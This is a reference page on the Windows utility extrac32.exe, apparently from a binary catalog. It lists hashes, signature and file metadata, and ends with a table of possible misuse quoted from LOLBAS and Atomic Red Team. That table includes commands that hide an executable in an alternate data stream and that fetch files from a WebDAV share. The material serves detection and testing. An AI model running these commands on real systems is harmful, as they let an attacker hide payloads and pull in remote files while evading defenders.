---
title: extrac32.exe | Microsoft CAB File Extract Utility
---

# extrac32.exe 

* File Path: `C:\windows\SysWOW64\extrac32.exe`
* Description: Microsoft CAB File Extract Utility
* Comments: 

## Hashes

Type | Hash
-- | --
MD5 | `86B9CB961782E250DC9ABA701AF1C4FA`
SHA1 | `998B6BDC5AD215818F45246E0DD053D1ACAF9A2A`
SHA256 | `2E2CAFD7954A9FB3FD321194BD3BB691CECEE01189A51E821ED1B40DCE929007`
SHA384 | `F184B267CBDBA09A7F451CDFCB9EBF765CBA5E0FDC4C15304CA3505C9E37C268F1F45081997808600D0F24819F823A56`
SHA512 | `C8B36D911AA86F209417218BAA11427FE926B71A3FC9387BE205FBDEF7655E788EBE274461070132EC9223E097CB485A54FFB1A75C572DB5F5B3D8A33AFDACBE`
SSDEEP | `768:zYDhe6vxKKGWodru4ZpzBnaLR6ZQhLhstdNus:zOheqxKbpz5a1nhYXus`

## Runtime Data

### Usage (stdout):
```Batchfile
Microsoft (R) Cabinet Extraction Tool
Copyright (c) Microsoft Corporation. All rights reserved..

 Cabinet help

07-01-2020  1:36:02a A---         2,362 ReportingEvents.log
07-01-2020  2:35:44a A---     1,118,208 Microsoft-Windows-AppXDeploymentServer-Operational.evtx
07-01-2020  2:35:44a A---        69,632 Microsoft-Windows-Store-Operational.evtx
07-01-2020  2:35:46a A---        69,632 Microsoft-Windows-WindowsUpdateClient-Operational.evtx
07-01-2020  2:35:46a A---        69,632 Microsoft-Windows-TWinUI-Operational.evtx
07-01-2020  1:35:58a A---        20,480 WindowsUpdate.20200701.013557.254.1.etl
07-01-2020  1:40:08a A---       139,264 WindowsUpdate.20200701.014006.958.1.etl
07-01-2020  1:40:30a ----       139,264 WindowsUpdate.20200701.014006.958.2.etl
06-06-2020  9:26:50p A---        65,536 domgmt.20200606_212649_061.etl
07-01-2020  1:40:32a A---        65,536 domgmt.20200701_014030_658.etl
07-01-2020  2:06:42a A---       131,072 domgmt.20200701_020640_946.etl
06-06-2020  9:25:30p A---        65,536 dosvc.20200606_212528_181.etl
                12 Files      1,956,154 bytes

```

### Usage (stderr):
```Batchfile

```

### Child Processes:


## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: extrac32.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 5.00 (WinBuild.160101.0800)
* Product Version: 5.00
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `extrac32.exe` being misused. While `extrac32.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Name: Extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Path: C:\Windows\System32\extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Path: C:\Windows\SysWOW64\extrac32.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


